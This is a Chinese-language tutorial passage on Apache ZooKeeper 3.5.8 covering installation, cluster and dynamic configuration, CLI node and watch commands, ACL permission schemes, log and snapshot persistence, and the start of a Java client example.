<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 下载zookeeper安装包</span></span><br><span class="line">wget https://mirror.bit.edu.cn/apache/zookeeper/zookeeper‐3.5.8/apache‐zookeepe r‐3.5.8‐bin.tar.gz </span><br><span class="line"></span><br><span class="line"><span class="comment"># 解压安装包</span></span><br><span class="line">tar ‐zxvf apache‐zookeeper‐3.5.8‐bin.tar.gz </span><br><span class="line"></span><br><span class="line"><span class="comment"># 进入目录</span></span><br><span class="line"><span class="built_in">cd</span> apache‐zookeeper‐3.5.8‐bin</span><br><span class="line"></span><br><span class="line"><span class="comment"># 将conf目录中提供的配置文件复制一份，名字可以随意取</span></span><br><span class="line"><span class="built_in">cp</span> zoo_sample.cfg zoo.cfg</span><br><span class="line"></span><br><span class="line"><span class="comment"># 通过zkServer.sh脚本启动zookeeper，指定配置文件</span></span><br><span class="line">bin/zkServer.sh start conf/zoo.cfg</span><br><span class="line"></span><br><span class="line"><span class="comment"># 通过zkCli.sh脚本启动客户端，可以通过-server参数指定主机和IP</span></span><br><span class="line">bin/zkCli.sh ‐server ip:port</span><br></pre></td></tr></table></figure>

<h2 id="集群搭建"><a href="#集群搭建" class="headerlink" title="集群搭建"></a>集群搭建</h2><h3 id="Zookeeper集群简介"><a href="#Zookeeper集群简介" class="headerlink" title="Zookeeper集群简介"></a>Zookeeper集群简介</h3><p>Zookeeper 集群模式一共有三种类型的角色：</p>
<ul>
<li><strong>Leader</strong>: 处理所有的事务请求（读写请求，一个集群中只能有一个Leader。</li>
<li><strong>Follower</strong>：只能处理读请求，同时作为 Leader的候选节点，即如果Leader宕机，Follower节点要参与到新的Leader选举中，有可能成为新的Leader节点。</li>
<li><strong>Observer</strong>：只能处理读请求，不参与事务请求的过半机制和Leader选举。</li>
</ul>
<h3 id="集群配置文件"><a href="#集群配置文件" class="headerlink" title="集群配置文件"></a>集群配置文件</h3><p>本文在一台机器上启动四个Zookeeper实例组成集群，包括一个Leader、两个Follower和一个Obsrver。如果在不同的机器上搭建只需要修改IP即可。</p>
<ul>
<li>修改配置文件<code>zoo.cfg</code></li>
</ul>
<p>将<code>zoo.cfg</code>复制4份，取不同的文件名，进行如下配置：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 由于是在同一台机器上搭建，所以每个配置文件这两项都要不同</span></span><br><span class="line">dataDir=/usr/local/zookeeper/zookeeper‐1/data</span><br><span class="line">clientPort=2181 </span><br><span class="line"></span><br><span class="line"><span class="comment"># 在结尾加上集群中四个节点的信息(不能有空格！！)</span></span><br><span class="line">server.1=localhost:2001:3001:participant <span class="comment"># participant可以不用写默认就是</span></span><br><span class="line">server.2=localhost:2002:3002:participant </span><br><span class="line">server.3=localhost:2003:3003:participant </span><br><span class="line">server.4=localhost:2004:3004:observer</span><br></pre></td></tr></table></figure>

<p>配置文件中参数配置说明</p>
<table>
<thead>
<tr>
<th>参数</th>
<th>说明</th>
</tr>
</thead>
<tbody><tr>
<td>tickTime</td>
<td>用于配置Zookeeper中最小时间单位的长度。</td>
</tr>
<tr>
<td>initLimit</td>
<td>用于配置Leader服务器等待Follower启动，并完成数据同步的时间（initLimit*tickTime）。Follower服务器再启动过程中，会与Leader建立连接并完成数据的同步，从而确定自己对外提供服务的起始状态。Leader服务器允许Follower在initLimit时间内完成这个工作。</td>
</tr>
<tr>
<td>syncLimit</td>
<td>Leader与Follower心跳检测的最大延时时间（syncLimit*tickTime）</td>
</tr>
<tr>
<td>dataDir</td>
<td>Zookeeper保存数据的目录，默认情况下Zookeeper将写数据的日志文件也保存在这个目录里。</td>
</tr>
<tr>
<td>clientPort</td>
<td>客户端连接 Zookeeper 服务器的端口，Zookeeper 会监听这个端口，接受客户端的访问请求。</td>
</tr>
<tr>
<td>server.A&#x3D;B：C：D：E</td>
<td>其中A是一个数字，表示这个服务器的ID；B是这个服务器的ip地址；C 表示的是这个服务器与集群中的Leader服务器交换信息的端口；D是进行选举的端口，用来执行选举时服务器相互通信。如果需要通过添加不参与集群选举以及事务请求的过半机制的Observer节点，可以在E的位置添加observer标识。</td>
</tr>
</tbody></table>
<ul>
<li>创建节点标识文件</li>
</ul>
<p>在每个节点配置的<code>dataDir</code>目录下创建<code>myid</code>文件，内容分别为1、2、3、4四个数字，表示各个节点的id。</p>
<ul>
<li>查看集群状态</li>
</ul>
<p>启动四个节点，通过<code>zkServer.sh status</code>命令指定配置文件查看节点状态，可以看到Zookeeper集群会自动选出一个节点作为Leader</p>
<p><img  
                     lazyload
                     alt="image"
                     data-src="https://i.loli.net/2021/06/03/DqmvHT1eSWUaEB8.jpg"
                      alt="Screenshot_95.jpg"
                ></p>
<h3 id="集群动态配置-新"><a href="#集群动态配置-新" class="headerlink" title="集群动态配置(新)"></a>集群动态配置(新)</h3><p>Zookeeper 3.5.0 以前，Zookeeper集群角色要发生改变的话，只能通过停掉所有的Zookeeper服务，修改集群配置，重启服务来完成，这样集群服务将有一段不可用的状态。为了应对高可用需求，Zookeeper 3.5.0 提供了支持动态扩容&#x2F;缩容的新特性。但是通过客户端API可以变更服务端集群状态是件很危险的事情，所以在Zookeeper 3.5.3 版本要用动态配置，需要开启<strong>超级管理员身份</strong>。如果是在一个安全的环境也可以通过配置jvm参数<code>-Dzookeeper.skipACL=yes</code>来避免配置维护ACL权限配置。</p>
<ul>
<li>首先开启超级管理员身份或者跳过ACL。</li>
<li>修改配置文件<code>zoo.cfg</code></li>
</ul>
<ol>
<li>去除端口号<code>clientPort</code>配置项</li>
<li>配置<code>reconfigEnabled</code>为true</li>
<li>通过<code>dynamicConfigFile</code>指定动态配置文件的路径，注意需要指定文件名，如<code>zoo1_re.cfg.dynamic</code></li>
</ol>
<ul>
<li>创建配置文件<code>zoo1_re.cfg.dynamic</code></li>
</ul>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">server.1=192.168.74.88:2001:3001:participant;192.168.74.88:2181</span><br><span class="line">server.2=192.168.74.88:2002:3002:participant;192.168.74.88:2182 </span><br><span class="line">server.3=192.168.74.88:2003:3003:participant;192.168.74.88:2183 </span><br><span class="line">server.4=192.168.74.88:2004:3004:observer;192.168.74.88:2184</span><br></pre></td></tr></table></figure>

<ul>
<li>接着按照如上步骤修改剩余3台服务器配置</li>
<li>启动所有的服务器后，连接上任意一台，即可开始操作</li>
</ul>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 查看集群配置</span></span><br><span class="line">config</span><br><span class="line"></span><br><span class="line"><span class="comment"># 该节点存储了集群信息</span></span><br><span class="line">get /zookeeper/config</span><br><span class="line"></span><br><span class="line"><span class="comment"># 移除serverId为3的机器</span></span><br><span class="line">reconfig ‐remove 3</span><br><span class="line"></span><br><span class="line"><span class="comment"># 添加机器</span></span><br><span class="line">reconfig ‐add server.3=192.168.74.88:2003:3003:participant;192.168.74.88:2183</span><br></pre></td></tr></table></figure>

<h2 id="命令行操作Zookeeper"><a href="#命令行操作Zookeeper" class="headerlink" title="命令行操作Zookeeper"></a>命令行操作Zookeeper</h2><p>登陆后，通过<code>help</code>命令可以查看Zookeeper所有命令：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">ZooKeeper -server host:port cmd args</span><br><span class="line">        addauth scheme auth</span><br><span class="line">        close </span><br><span class="line">        config [-c] [-w] [-s]</span><br><span class="line">        connect host:port</span><br><span class="line">        create [-s] [-e] [-c] [-t ttl] path [data] [acl]</span><br><span class="line">        delete [-v version] path</span><br><span class="line">        deleteall path</span><br><span class="line">        delquota [-n|-b] path</span><br><span class="line">        get [-s] [-w] path</span><br><span class="line">        getAcl [-s] path</span><br><span class="line">        <span class="built_in">history</span> </span><br><span class="line">        listquota path</span><br><span class="line">        <span class="built_in">ls</span> [-s] [-w] [-R] path</span><br><span class="line">        ls2 path [watch]</span><br><span class="line">        printwatches on|off</span><br><span class="line">        quit </span><br><span class="line">        reconfig [-s] [-v version] [[-file path] | [-members serverID=host:port1:port2;port3[,...]*]] | [-add serverId=host:port1:port2;port3[,...]]* [-remove serverId[,...]*]</span><br><span class="line">        redo cmdno</span><br><span class="line">        removewatches path [-c|-d|-a] [-l]</span><br><span class="line">        rmr path</span><br><span class="line">        <span class="built_in">set</span> [-s] [-v version] path data</span><br><span class="line">        setAcl [-s] [-v version] [-R] path acl</span><br><span class="line">        setquota -n|-b val path</span><br><span class="line">        <span class="built_in">stat</span> [-w] path</span><br><span class="line">        <span class="built_in">sync</span> path</span><br></pre></td></tr></table></figure>

<h3 id="创建节点"><a href="#创建节点" class="headerlink" title="创建节点"></a>创建节点</h3><p>通过如下命令创建节点：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">create [‐s] [‐e] [‐c] [‐t ttl] path [data] [acl]</span><br><span class="line"><span class="comment"># -s: 顺序节点 </span></span><br><span class="line"><span class="comment"># -e: 临时节点 </span></span><br><span class="line"><span class="comment"># -c: 容器节点 </span></span><br><span class="line"><span class="comment"># -t: 可以给节点添加过期时间ttl，默认禁用，需要通过系统参数启用</span></span><br><span class="line"><span class="comment"># path: 必须要写，节点的路径</span></span><br><span class="line"><span class="comment"># data: 创建节点时可以给节点添加数据</span></span><br><span class="line"><span class="comment"># acl: 用于权限控制</span></span><br></pre></td></tr></table></figure>

<blockquote>
<p>Zookeeper中没有相对路径的说法，所有的路径都必须以<code>/</code>开头。</p>
</blockquote>
<ul>
<li>创建持久化节点</li>
</ul>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">create /test somedata</span><br></pre></td></tr></table></figure>

<p>没有加任何可选节点类型的参数，创建的就是持久化节点。</p>
<ul>
<li>创建临时节点</li>
</ul>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">create ‐e /test somedata</span><br></pre></td></tr></table></figure>

<p>临时节点不能有子节点。</p>
<ul>
<li>创建顺序节点</li>
</ul>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">create ‐s /test/ data</span><br></pre></td></tr></table></figure>

<p>创建顺序节点时可以不写节点名称，Zookeeper会自动在节点名称后添加10位的序号，序号依次递增。当然也可以传入一个节点名称作为前缀。</p>
<ul>
<li>创建容器节点</li>
</ul>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">create ‐c /test</span><br></pre></td></tr></table></figure>

<p>容器节点主要用来容纳子节点，如果没有给其创建子节点，容器节点表现和持久化节点一样，如果给容器节点创建了子节点，后续又把子节点清空，那么容器节点也会被Zookeeper删除。</p>
<ul>
<li>创建子节点</li>
</ul>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">create /test/test‐sub</span><br></pre></td></tr></table></figure>

<p>由于Zookeeper中没有相对路径的概念，所以所有的路径都必须以<code>/</code>开头，从头开始写。</p>
<h3 id="修改节点"><a href="#修改节点" class="headerlink" title="修改节点"></a>修改节点</h3><p>Zookeeper中只能修改节点数据，而不能修改节点名称：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 添加-v参数可传入version版本号，如果版本不匹配则修改失败</span></span><br><span class="line"><span class="built_in">set</span> [-v version] /test somenewdata</span><br></pre></td></tr></table></figure>

<h3 id="查看节点"><a href="#查看节点" class="headerlink" title="查看节点"></a>查看节点</h3><ul>
<li>查看子节点</li>
</ul>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 加上-R参数可以递归查看所有子节点</span></span><br><span class="line"><span class="built_in">ls</span> [-R] /test</span><br></pre></td></tr></table></figure>

<ul>
<li>查看节点数据</li>
</ul>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">get /test</span><br></pre></td></tr></table></figure>

<ul>
<li>查看节点状态</li>
</ul>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">stat</span> /test</span><br></pre></td></tr></table></figure>

<p>节点状态包含如下信息：</p>
<ol>
<li>cZxid：创建znode的事务ID（Zxid的值）。</li>
<li>mZxid：最后修改znode的事务ID。</li>
<li>pZxid：最后添加或删除子节点的事务ID（子节点列表发生变化才会发生改变）。</li>
<li>time：znode创建时间。</li>
<li>mtime：znode最近修改时间。</li>
<li>dataVersion：znode的当前数据版本。</li>
<li>cversion：znode的子节点结果集版本（一个节点的子节点增加、删除都会影响这个版本）。</li>
<li>aclVersion：表示对此znode的acl版本。</li>
<li>ephemeralOwner：znode是临时znode时，表示znode所有者的 session ID。 如果znode不是临时znode，则该字段设置为零。</li>
<li>dataLength：znode数据字段的长度。numChildren：znode的子znode的数量。</li>
</ol>
<ul>
<li>查看节点状态信息同时查看数据</li>
</ul>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">get -s /test</span><br></pre></td></tr></table></figure>

<blockquote>
<p>根据状态数据中的版本号，可以实现<strong>乐观锁</strong>的功能，应用于并发修改数据的场景：</p>
<ol>
<li>客户端先通过<code>get -s</code>命令获取数据和版本信息</li>
<li>接着通过<code>set -v</code>修改数据时候把版本号带上</li>
</ol>
<p>在执行上面set命令前，如果有别的客户端修改了数据，Zookeeper会递增版本号， 这时如果再用以前的版本号去修改则会修改失败。</p>
</blockquote>
<h3 id="创建监听"><a href="#创建监听" class="headerlink" title="创建监听"></a>创建监听</h3><p>Zookeeper事件类型如下：</p>
<ol>
<li>None: 连接建立事件</li>
<li>NodeCreated： 节点创建</li>
<li>NodeDeleted： 节点删除</li>
<li>NodeDataChanged：节点数据变化</li>
<li>NodeChildrenChanged：子节点列表变化</li>
<li>DataWatchRemoved：节点监听被移除</li>
<li>ChildWatchRemoved：子节点监听被移除</li>
</ol>
<p>Zookeeper中，无论是何种监听方式，对于每个不同路径的节点都只能监听一次事件，之后事件将被移除。</p>
<ul>
<li>对节点的监听</li>
</ul>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 注册监听的同时获取数据 </span></span><br><span class="line">get ‐w /test </span><br><span class="line"></span><br><span class="line"><span class="comment"># 对节点进行监听，且获取元数据信息</span></span><br><span class="line"><span class="built_in">stat</span> ‐w /test</span><br></pre></td></tr></table></figure>

<p>当节点被修改时会接收到事件，并且事件会被移除。</p>
<ul>
<li>对目录的监听</li>
</ul>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">ls</span> -w /test</span><br></pre></td></tr></table></figure>

<p>对某个目录添加监听时，仅仅针对其子节点（不能递归监听）的添加或者删除，而不会监听数据变化。且事件一旦触发，对应的监听也会被移除。</p>
<ul>
<li>对目录递归的监听</li>
</ul>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">ls</span> -R -w /test</span><br></pre></td></tr></table></figure>

<p>对目录进行递归监听，可以递归监听其中的所有节点的添加或者删除。每个不同路径的节点可以监听一次。</p>
<ul>
<li>移除监听</li>
</ul>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">removewatches /test</span><br></pre></td></tr></table></figure>

<h3 id="ACL权限控制"><a href="#ACL权限控制" class="headerlink" title="ACL权限控制"></a>ACL权限控制</h3><h4 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h4><p>Zookeeper的ACL( Access Control List ) 权限控制，可以控制节点的读写操作，保证数据的安全性。Zookeeper 的ACL权限设置分为 3 部分组成：</p>
<p><strong>权限模式</strong>（Scheme）、<strong>授权对象</strong>（ID）、<strong>权限信息</strong>（Permission）。</p>
<p>最终组成一条类似<code>scheme:id:permission</code>格式的ACL请求信息。下面我们具体看一下这 3 部分代表什么意思：</p>
<ul>
<li><strong>权限模式（Scheme）</strong></li>
</ul>
<p>用来设置 ZooKeeper 服务器进行权限验证的方式。ZooKeeper 的权限验证方式大体分为两种类型：</p>
<ol>
<li><strong>范围验证</strong>。所谓的范围验证就是说 ZooKeeper 可以针对一个 IP 或者一段 IP 地址授予某种权限。比如我们可以让一个 IP 地址为<code>192.168.74.77</code>的机器对服务器上的某个数据节点具有写入的权限。或者也可以通过<code>192.168.74.77/24</code>给一段 IP 地址的机器赋权。</li>
<li><strong>口令验证</strong>。也就是用户名密码的方式。在 ZooKeeper 中这种验证方式是 Digest 认证，而 Digest 这种认证方式首先在客户端传送<code>username:password</code>这种形式的权限表示符后，ZooKeeper 服务端会对密码部分使用 SHA-1 和 BASE64 算法进行加密，以保证安全性。还有一种 Super 权限模式，Super可以认为是一种特殊的 Digest 认证。具有 Super 权限的客户端可以对 ZooKeeper 上的任意数据节点进行任意操作。</li>
</ol>
<ul>
<li><strong>授权对象（ID）</strong></li>
</ul>
<p>授权对象就是说我们要把权限赋予谁，而对应于 4 种不同的权限模式来说，如果我们选择采用 IP 方式，使用的授权对象可以是一个 IP 地址或 IP 地址段；而如果使用 Digest 或 Super 方式，则对应于一个用户名。另外如果是 World 模式，是授权系统中所有的用户。</p>
<ul>
<li><strong>权限信息（Permission）</strong></li>
</ul>
<p>权限就是指我们可以在数据节点上执行的操作种类，在 ZooKeeper 中已经定义好的权限有 5 种：</p>
<ol>
<li>数据节点（c: create）创建权限，授予权限的对象可以在数据节点下创建子节点；</li>
<li>数据节点（w: wirte）更新权限，授予权限的对象可以更新该数据节点；</li>
<li>数据节点（r: read）读取权限，授予权限的对象可以读取该节点的内容以及子节点的列表信息；</li>
<li>数据节点（d: delete）删除权限，授予权限的对象可以删除该数据节点的子节点；</li>
<li>数据节点（a: admin）管理者权限，授予权限的对象可以对该数据节点体进行 ACL 权限设置。</li>
</ol>
<blockquote>
<p>可以通过配置jvm参数<code>zookeeper.skipACL=yes</code>，使ACL不再进行权限检测。</p>
</blockquote>
<h4 id="相关命令"><a href="#相关命令" class="headerlink" title="相关命令"></a>相关命令</h4><ul>
<li>Digest 密文认证方式</li>
</ul>
<p>首先先通过如下命令对密码进行加密，在Linux命令行输入即可：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># user表示用户名,password表示密码</span></span><br><span class="line"><span class="built_in">echo</span> -n liduoan:123456 | openssl dgst -binary -sha1 | openssl <span class="built_in">base64</span></span><br><span class="line">nPDrrZYJrye2xSzRMayVFW17lXI=</span><br><span class="line"><span class="comment"># 假设用户名密码为liduoan:123456得到的结果为PoFrAp0Ngx6FWzLetiQRKMMWXDA=</span></span><br></pre></td></tr></table></figure>

<p>接着开始创建ACL，格式为<code>模式:用户名:加密后的密码:权限</code>：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 可以在创建节点的时候就创建ACL，此时必须传入节点数据，否则会将acl信息当成数据</span></span><br><span class="line">create /test somedate digest:liduoan:nPDrrZYJrye2xSzRMayVFW17lXI=:cdrwa</span><br><span class="line"></span><br><span class="line"><span class="comment"># 通过setAcl命令给节点设置ACL</span></span><br><span class="line">setAcl /test digest:liduoan:nPDrrZYJrye2xSzRMayVFW17lXI=:cdrwa</span><br></pre></td></tr></table></figure>

<p>这样就添加ACL成功了，只有对应的用户才有访问该节点的权限。现在访问该节点，会报如下错误：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">org.apache.zookeeper.KeeperException<span class="variable">$NoAuthException</span>: KeeperErrorCode = NoAuth <span class="keyword">for</span> /zk-node</span><br></pre></td></tr></table></figure>

<p>要通过如下命令进行授权信息添加后，才能访问该节点：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">addauth digest liduoan:123456</span><br></pre></td></tr></table></figure>

<ul>
<li>Auth 明文认证方式</li>
</ul>
<p>口令验证的另一种方式是明文认证，可以直接添加授权信息：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">addauth digest liduoan:654321</span><br></pre></td></tr></table></figure>

<p>注册完后可以直接使用明文授权，格式为：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 注意模式为auth</span></span><br><span class="line">create /test somedate auth:liduoan:654321:cdwra</span><br></pre></td></tr></table></figure>

<ul>
<li>IP授权模式</li>
</ul>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 创建节点时授权</span></span><br><span class="line">create /test somedate ip:192.168.74.88:cdwra</span><br><span class="line"></span><br><span class="line"><span class="comment"># 通过setAcl命令授权</span></span><br><span class="line">setAcl /test ip:192.168.74.88:cdwra</span><br></pre></td></tr></table></figure>

<p>多个ip可以用逗号分隔。</p>
<ul>
<li>Super超级管理员模式</li>
</ul>
<p>在Super模式下超级管理员用户可以对Zookeeper上的节点进行任何的操作，需要通过jvm参数开启：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">zookeeper.DigestAuthenticationProvider.superDigest=&lt;用户名&gt;:&lt;加密后的密码&gt;</span><br></pre></td></tr></table></figure>

<ul>
<li>查询ACL信息</li>
</ul>
<p>可以通过如下命令查询节点的ACL信息：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">getACL /test</span><br></pre></td></tr></table></figure>

<h3 id="持久化"><a href="#持久化" class="headerlink" title="持久化"></a>持久化</h3><p>Zookeeper数据的组织形式为一个类似文件系统的数据结构，而这些数据都是存储在内存中的，所以可以认为Zookeeper是一个基于内存的小型数据库。Zookeeper有两种持久化文件：</p>
<h4 id="事务日志log"><a href="#事务日志log" class="headerlink" title="事务日志log"></a>事务日志log</h4><p>针对每一次客户端的事务操作，Zookeeper都会将他们记录到事务日志中，当然，Zookeeper也会将数据变更应用到内存数据库中。我们可以在zookeeper的主配置文件<code>zoo.cfg</code>中配置内存中的数据持久化目录，也就是事务日志的存储路径<code>dataLogDir</code>， 如果没有配置该项，那么事务日志将存储到<code>dataDir</code>配置的目录。Zookeeper提供了格式化工具可以进行数据查看事务日志数据：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 最后一项为log日志文件的路径</span></span><br><span class="line">java -classpath .:slf4j-api-1.7.25.jar:zookeeper-3.5.8.jar:zookeeper-jute-3.5.8.jar org.apache.zookeeper.server.LogFormatter /tmp/zookeeper/version-2/log.1</span><br></pre></td></tr></table></figure>

<p>执行结果如下所示：</p>
<p><img  
                     lazyload
                     alt="image"
                     data-src="https://i.loli.net/2021/06/02/sHgwJIcFAVvxEye.jpg"
                      alt="Screenshot_94.jpg"
                ></p>
<p>从左到右分别记录了操作时间、客户端会话ID、CXID、ZXID、操作类型、节点路径、节点数据（用<code>#+ascii码</code>表示）、节点版本。</p>
<p>Zookeeper进行事务日志文件操作的时候会频繁进行磁盘IO操作，事务日志的不断追加写操作会触发底层磁盘IO为文件开辟新的磁盘块，即磁盘Seek。因此，为了提升磁盘IO的效率，Zookeeper在创建事务日志文件的时候就进行文件空间的预分配，即在创建文件的时候，就向操作系统申请一块大一点的磁盘块。这个预分配的磁盘大小可以通过jvm参数<code>zookeeper.preAllocSize</code>进行配置。</p>
<p>事务日志文件名为 <code>log.当前最大事务ID</code>，因为日志文件是顺序写入的，所以我们可以根据日志文件名找到对应事务。如果文件满了会创建新的日志文件继续写入。</p>
<h4 id="数据快照snapshot"><a href="#数据快照snapshot" class="headerlink" title="数据快照snapshot"></a>数据快照snapshot</h4><p>数据快照用于记录Zookeeper服务器上某一时刻的全量数据，并将其写入到指定的磁盘文件中。可以通过配置文件中的<code>snapCount</code>配置每间隔多少个事务请求生成快照，数据存储在<code>dataDir</code>指定的目录中。</p>
<p>Zookeeper为了避免集群中所有机器在同一时间进行快照，实际的快照生成时机可能和配置文件中配置的有所不同，实际是经过<code>snapCount/2 + Random(1,snapCount/2)</code> 个事务数时开始快照。Zookeeper提供了格式化工具可以进行数据查看快照数据：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 最后一项为snapshot快照文件的路径</span></span><br><span class="line">java -classpath :slf4j-api-1.7.25.jar:zookeeper-3.5.8.jar:zookeeper-jute-3.5.8.jar org.apache.zookeeper.server.SnapshotFormatter /tmp/zookeeper/version-2/snapshot.0</span><br></pre></td></tr></table></figure>

<p>快照数据文件名为同样为<code>snapshot.当前最大事务ID</code>。如果文件满了会创建新的快照文件继续写入。</p>
<blockquote>
<p>有了事务日志，为啥还要快照数据快照？</p>
<p><strong>Zookeeper中的事务日志与数据快照的关系，类似于Redis中RDB与AOF的关系。</strong>数据快照是达到某种设定条件下的内存全量数据，主要是为了快速恢复，而事务日志文件是每次事务请求都会进行追加的操作。所以通常快照数据是反应当时内存数据的状态，而事务日志是更全面的数据。所以恢复数据的时候，可以先恢复快照数据，再通过增量恢复事务日志中的数据即可。</p>
</blockquote>
<h2 id="客户端使用"><a href="#客户端使用" class="headerlink" title="客户端使用"></a>客户端使用</h2><h3 id="Zookeeper原生客户端"><a href="#Zookeeper原生客户端" class="headerlink" title="Zookeeper原生客户端"></a>Zookeeper原生客户端</h3><p>Zookeeper官方的客户端没有和服务端代码分离，他们为同一个jar文件，所以我们直接引入Zookeeper的maven即可，这里版本请保持与服务端版本一致，不然会有很多兼容性的问题：</p>
<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>org.apache.zookeeper<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span> </span><br><span class="line">    <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>zookeeper<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span> </span><br><span class="line">    <span class="tag">&lt;<span class="name">version</span>&gt;</span>3.5.8<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br></pre></td></tr></table></figure>

<h4 id="创建客户端实例"><a href="#创建客户端实例" class="headerlink" title="创建客户端实例"></a>创建客户端实例</h4><p>在操作Zookeeper之前，首先需要创建一个Zookeeper客户端实例：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="meta">@Slf4j</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">ZkTest</span> &#123;</span><br><span class="line">    </span><br><span class="line">    <span class="comment">// Zookeeper客户端</span></span><br><span class="line">    ZooKeeper zooKeeper;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Before</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">before</span><span class="params">()</span> <span class="keyword">throws</span> IOException, InterruptedException &#123;</span><br><span class="line">        <span class="comment">// 创建一个countDownLatch</span></span><br><span class="line">        <span class="type">CountDownLatch</span> <span class="variable">countDownLatch</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">CountDownLatch</span>(<span class="number">1</span>);</span><br><span class="line">        <span class="comment">// 创建一个Zookeeper中的监听器Watcher，用于监听连接事件 </span></span><br><span class="line">        <span class="type">Watcher</span> <span class="variable">watcher</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Watcher</span>() &#123;</span><br><span class="line">            <span class="meta">@Override</span></span><br><span class="line">            <span class="comment">// 实现监听器的process方法</span></span><br><span class="line">            <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">process</span><span class="params">(WatchedEvent watchedEvent)</span> &#123;</span><br><span class="line">                <span class="comment">// 获取事件的类型</span></span><br><span class="line">                Event.<span class="type">EventType</span> <span class="variable">type</span> <span class="operator">=</span> watchedEvent.getType();</span><br><span class="line">                <span class="comment">// 获取事件状态</span></span><br><span class="line">                Event.<span class="type">KeeperState</span> <span class="variable">state</span> <span class="operator">=</span> watchedEvent.getState();</span><br><span class="line">                <span class="comment">// 如果类型为None并且事件状态为SyncConnected表示连接成功</span></span><br><span class="line">                <span class="keyword">if</span> (type == Event.EventType.None &amp;&amp; state == Event.KeeperState.SyncConnected) &#123;</span><br><span class="line">                    log.info(<span class="string">&quot;连接成功！&quot;</span>);</span><br><span class="line">                    <span class="comment">// 主线程放行</span></span><br><span class="line">                    countDownLatch.countDown();</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;;</span><br><span class="line">        <span class="comment">// 创建客户端实例ZooKeeper</span></span><br><span class="line">        zooKeeper = <span class="keyword">new</span> <span class="title class_">ZooKeeper</span>(<span class="string">&quot;192.168.74.88&quot;</span>, <span class="number">30</span> * <span class="number">1000</span>, watcher);</span><br><span class="line">        log.info(<span class="string">&quot;正在连接！&quot;</span>);</span><br><span class="line">        <span class="comment">// 主线程等待客户端连接完成后再往下继续运行</span></span><br><span class="line">        countDownLatch.await();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<blockquote>
<p>Zookeeper客户端的连接是异步的，发送请求与接收事件通知由<strong>sendThread</strong>和<strong>eventThread</strong>两个线程完成，所以想要主线程等待连接完成后再往下走，需要等待客户端连接成功后才能放行。</p>
</blockquote>
<p>创建Zookeeper客户端实例包括以下参数：</p>
<table>
<thead>
<tr>
<th>参数</th>
<th>说明</th>
</tr>
</thead>
<tbody><tr>
<td>*connectString</td>
<td>ZooKeeper服务器列表，由英文逗号分开的 host:port 字符串组成。另外，也可以在其中设置客户端连接上ZooKeeper后的根目录，这样该客户端连接上ZooKeeper服务器之后，所有对ZooKeeper的操作都会基于这个根目录。</td>
</tr>
<tr>
<td>*sessionTimeout</td>
<td>会话的超时时间，是一个以毫秒为单位的整型值。在ZooKeeper中有会话的概念，在一个会话周期内，ZooKeeper客户端和服务器之间会通过心跳检测机制来维持会话的有效性，一旦在sessionTimeout时间内没有进行有效的心跳检测，会话就会失效。</td>
</tr>
<tr>
<td>*watcher</td>
<td>ZooKeeper允许客户端在构造方法中传入一个接口Watcher的实现类对象来作为默认的 Watcher事件通知处理器。该参数可以设置为null以表明不需要设置默认的Watcher处理器。</td>
</tr>
<tr>
<td>canBeReadOnly</td>
